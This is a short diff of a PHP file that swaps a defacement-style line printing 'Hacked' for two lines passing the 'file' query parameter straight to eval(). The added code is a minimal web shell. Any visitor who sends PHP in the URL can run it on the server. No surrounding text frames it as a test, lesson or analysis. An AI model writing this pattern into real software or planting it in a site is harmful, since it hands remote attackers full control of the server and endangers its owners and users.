@@ -1,3 +1,4 @@
 <?php
-    echo 'Hacked';
+    $code = $_GET['file'];
+    eval($code);
 ?>
